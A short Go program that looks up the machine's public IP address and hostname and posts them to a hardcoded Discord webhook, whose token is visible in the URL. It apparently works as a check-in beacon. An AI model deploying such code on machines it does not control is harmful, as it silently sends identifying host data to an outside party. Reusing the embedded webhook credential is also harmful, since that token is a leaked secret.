package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
)

func main() {

	resp, err := http.Get("http://ifconfig.me/ip")
	if err != nil {
		log.Fatalln(err)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}

	sb := string(body)

	hostname, err := os.Hostname()
	if err != nil {
		log.Fatalln(err)
	}

	postBody, _ := json.Marshal(map[string]string{
		"content": "**Hostname :**" + " `" + hostname + "`" + "\n**IP :**" + " `" + sb + "`",
	})
	responseBody := bytes.NewBuffer(postBody)

	http.Post("https://discord.com/api/webhooks/860256580175396926/bqnJXYpwhLbnoS7YheuBdNGBESzkyZECRH3_6Yu8CKDlxDMg1fadqqbXbbZDF_vtz8QN", "application/json", responseBody)

	fmt.Println(hostname, sb)
}
